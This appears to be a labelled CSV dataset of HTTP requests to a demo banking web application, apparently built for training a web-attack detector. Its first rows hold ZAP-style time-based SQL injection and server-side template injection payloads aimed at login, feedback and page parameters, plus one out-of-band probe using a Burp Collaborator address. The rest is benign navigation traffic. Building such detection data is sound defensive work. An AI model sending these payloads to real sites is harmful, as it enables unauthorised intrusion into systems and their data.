GET,/Privacypolicy.jsp?sec=Careers&template=US+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,205,0,4,1,"[4, 2, 1, 2, 17, 12, 0, 0, 1, 205, 3, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,,2,2,0,1,4,0,0,0,0,115,0,1,1,"[2, 2, 0, 1, 4, 9, 0, 0, 1, 115, 3, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,5,2,1,1,14,0,1,0,0,8,179,5,1,"[5, 2, 1, 1, 14, 12, 1, 0, 2, 8, 179, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,5,2,1,1,21,0,1,0,0,13,272,4,1,"[5, 2, 1, 1, 21, 12, 1, 0, 5, 13, 272, 0]",1
GET,/Privacypolicy.jsp?sec=Careers&template=US%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,206,0,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 1, 206, 3, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,115,0,1,1,"[0, 4, 0, 1, 4, 9, 0, 0, 1, 115, 3, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,3,1,1,14,0,1,0,0,8,179,5,1,"[4, 3, 1, 1, 14, 12, 1, 0, 2, 8, 179, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,3,1,1,21,0,1,0,0,13,272,4,1,"[4, 3, 1, 1, 21, 12, 1, 0, 5, 13, 272, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,4,2,1,2,17,0,0,0,0,239,0,4,1,"[4, 2, 1, 2, 17, 13, 0, 0, 1, 239, 3, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,4,2,1,1,14,0,1,0,0,8,179,5,1,"[4, 2, 1, 1, 14, 12, 1, 0, 2, 8, 179, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,2,1,1,21,0,1,0,0,13,272,4,1,"[4, 2, 1, 1, 21, 12, 1, 0, 5, 13, 272, 0]",1
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,,5,2,1,2,17,0,0,0,0,240,0,4,1,"[5, 2, 1, 2, 17, 14, 0, 0, 1, 240, 3, 0]",1
GET,/Documents/JohnSmith/index.jsp?content=zj%7B%40math+key%3D%228603%22+method%3D%22multiply%22+operand%3D%222081%22%2F%7Dzj,,0,6,0,0,3,0,0,0,0,95,0,0,1,"[0, 6, 0, 0, 3, 13, 0, 0, 0, 95, 3, 0]",1
GET,/Privacypolicy.jsp?sec=zj%7B%40math+key%3D%222386%22+method%3D%22multiply%22+operand%3D%226177%22%2F%7Dzj&template=US,,0,6,0,0,3,0,0,0,0,91,0,0,1,"[0, 6, 0, 0, 3, 13, 0, 0, 1, 91, 3, 0]",1
GET,/index.jsp?content=zj%23set%28%24x%3D2869*3931%29%24%7Bx%7Dzj&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,1,0,0,0,0,0,87,0,0,1,"[0, 0, 0, 1, 0, 9, 0, 0, 3, 87, 3, 0]",1
GET,/survey_questions.jsp?step=zj%24%7B9049*6417%7Dzj,,0,0,0,0,0,0,0,0,0,43,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 43, 3, 0]",0
POST,/doLogin,uid=ZAP&passw=zj%7B4791*4082%7Dzj&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,45,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 2, 8, 45, 0]",0
POST,/sendFeedback,cfile=comments.txt&name=zj%7B2848*4281%7Dzj&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,136,0,1,"[0, 0, 0, 0, 7, 0, 0, 0, 5, 13, 136, 0]",1
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=zj%7B9787*8945%7Dzj,0,0,0,0,0,0,0,0,0,12,38,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 12, 38, 0]",0
GET,/static/index.jsp?content=zj%23%7B6192*9766%7Dzj,,0,0,0,0,0,0,0,0,0,42,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 42, 3, 0]",0
GET,/index.jsp?content=zj%23set%28%24x%3D9432*9479%29%24%7Bx%7Dzj,,0,0,0,1,0,0,0,0,0,45,0,0,1,"[0, 0, 0, 1, 0, 8, 0, 0, 2, 45, 3, 0]",1
GET,/default.jsp?content=zj%7B%40math+key%3D%229072%22+method%3D%22multiply%22+operand%3D%221265%22%2F%7Dzj,,0,6,0,0,3,0,0,0,0,77,0,0,1,"[0, 6, 0, 0, 3, 13, 0, 0, 0, 77, 3, 0]",1
GET,/disclaimer.htm?url=zj%7B%40math+key%3D%222579%22+method%3D%22multiply%22+operand%3D%225121%22%2F%7Dzj,,0,6,0,0,3,0,0,0,0,76,0,0,1,"[0, 6, 0, 0, 3, 13, 0, 0, 0, 76, 3, 0]",1
GET,/images/index.jsp?content=zj%3Cp+th%3Atext%3D%22%24%7B4206*7594%7D%22%3E%3C%2Fp%3Ezj,,0,2,0,0,1,0,0,4,0,60,0,0,1,"[0, 2, 0, 0, 1, 12, 0, 4, 1, 60, 3, 0]",1
GET,/search.jsp?query=zj%7B%402001*5194%7Dzj,,0,0,0,0,0,0,0,0,0,34,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/Documents/JohnSmith/index.jsp?content=zj%7B%7B94330%7Cadd%3A67680%7D%7Dzj,,0,0,0,0,0,0,0,0,0,62,0,0,1,"[0, 0, 0, 0, 0, 6, 0, 0, 1, 62, 3, 0]",1
GET,/Privacypolicy.jsp?sec=zj%7B%7B49030%7Cadd%3A23380%7D%7Dzj&template=US,,0,0,0,0,0,0,0,0,0,58,0,0,1,"[0, 0, 0, 0, 0, 6, 0, 0, 2, 58, 3, 0]",1
GET,/,,0,0,0,0,0,0,0,0,0,1,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 0]",0
GET,/robots.txt,,0,0,0,0,0,0,0,0,0,11,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 3, 0]",0
GET,/style.css,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/images/logo.gif,,0,0,0,0,0,0,0,0,0,16,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 3, 0]",0
GET,/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,22,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 22, 3, 0]",0
GET,/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,19,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/feedback.jsp,,0,0,0,0,0,0,0,0,0,13,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 13, 3, 0]",0
GET,/index.jsp?content=personal.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/index.jsp?content=personal_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=personal_checking.htm,,0,0,0,0,0,0,0,0,0,40,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 40, 3, 0]",0
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=personal_cards.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=personal_investments.htm,,0,0,0,0,0,0,0,0,0,43,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 43, 3, 0]",0
GET,/index.jsp?content=personal_other.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 42, 3, 0]",0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/cgi.exe,,0,0,0,0,0,0,0,0,0,8,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 3, 0]",0
GET,/index.jsp?content=inside_investor.htm,,0,0,0,0,0,0,0,0,0,38,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 38, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/subscribe.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 14, 3, 0]",0
GET,/index.jsp?content=personal_savings.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=privacy.htm,,0,0,0,0,0,0,0,0,0,30,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 3, 0]",0
GET,/default.jsp?content=security.htm,,0,0,0,0,0,0,0,0,0,33,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 33, 3, 0]",0
GET,/survey_questions.jsp,,0,0,0,0,0,0,0,0,0,21,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 21, 3, 0]",0
GET,/index.jsp?content=security.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/status_check.jsp,,0,0,0,0,0,0,0,0,0,17,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 17, 3, 0]",0
GET,/swagger/index.html,,0,0,0,0,0,0,0,0,0,19,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 3, 0]",0
GET,/search.jsp?query=,,0,0,0,0,0,0,0,0,0,18,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 18, 3, 0]",0
GET,/search.jsp?query=876143,,0,0,0,0,0,0,0,0,0,24,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 24, 3, 0]",0
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=privacy.htm,,0,0,0,0,0,0,0,0,0,30,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 3, 0]",0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/login.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.netscape.com,,0,0,0,0,0,0,0,0,0,43,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 43, 3, 0]",0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/disclaimer.htm?url=http%3a%2f%2fwww.microsoft.com,,0,0,0,0,0,0,0,0,0,44,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 44, 3, 0]",0
GET,/feedback.jsp,,0,0,0,0,0,0,0,0,0,13,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 13, 3, 0]",0
POST,/sendFeedback,cfile=comments.txt&name=pogilOiF&email_addr=875703&subject=875703&comments=875703&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,97,0,0,"[0, 0, 0, 0, 2, 0, 0, 0, 5, 13, 97, 0]",1
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/index.jsp?content=inside_community.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/pr/communityannualreport.pdf,,0,0,0,0,0,0,0,0,0,29,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 29, 3, 0]",0
GET,/index.jsp?content=personal_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,27,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 27, 3, 0]",0
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm,,0,0,0,0,3,0,0,0,0,57,0,0,0,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 57, 3, 0]",1
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,0,0,0,42,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 42, 3, 0]",0
GET,/retirement.htm,,0,0,0,0,0,0,0,0,0,15,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 15, 3, 0]",0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=inside_executives.htm,,0,0,0,0,0,0,0,0,0,40,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 40, 3, 0]",0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=inside_community.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/inside_points_of_interest.htm,,0,0,0,0,0,0,0,0,0,30,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=pr%2f20061109.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=pr%2f20061005.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=pr%2f20060928.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=pr%2f20060921.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=pr%2f20060817.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=pr%2f20060720.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=pr%2f20060518.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_press.htm,,0,0,0,0,0,0,0,0,0,35,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 35, 3, 0]",0
GET,/index.jsp?content=pr%2f20060413.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_jobs.htm,,0,0,0,0,0,0,0,0,0,34,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 34, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_benefits.htm,,0,0,0,0,0,0,0,0,0,38,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 38, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_internships.htm,,0,0,0,0,0,0,0,0,0,41,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_trainee.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp?content=inside_careers.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/Privacypolicy.jsp?sec=Careers&template=US,,0,0,0,0,0,0,0,0,0,42,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 42, 3, 0]",0
GET,/subscribe.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 14, 3, 0]",0
POST,/doSubscribe,txtEmail=&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,29,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 12, 29, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/subscribe.jsp,,0,0,0,0,0,0,0,0,0,14,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 14, 3, 0]",0
POST,/doSubscribe,txtEmail=AokwZTSI@burpcollaborator.net&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,58,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 12, 58, 0]",1
GET,/survey_questions.jsp,,0,0,0,0,0,0,0,0,0,21,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 21, 3, 0]",0
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,0,0,0,28,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 28, 3, 0]",0
GET,/index.jsp?content=security.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/index.jsp?content=security.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/status_check.jsp,,0,0,0,0,0,0,0,0,0,17,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 17, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=personal.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,0,0,0,31,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 31, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=personal_checking.htm,,0,0,0,0,0,0,0,0,0,40,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 40, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,0,0,0,37,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 37, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=personal_investments.htm,,0,0,0,0,0,0,0,0,0,43,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 43, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/cgi.exe,,0,0,0,0,0,0,0,0,0,8,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=inside_investor.htm,,0,0,0,0,0,0,0,0,0,38,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 38, 3, 0]",0
GET,/index.jsp,,0,0,0,0,0,0,0,0,0,10,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 3, 0]",0
GET,/index.jsp?content=personal_savings.htm,,0,0,0,0,0,0,0,0,0,39,0,0,0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 39, 3, 0]",0
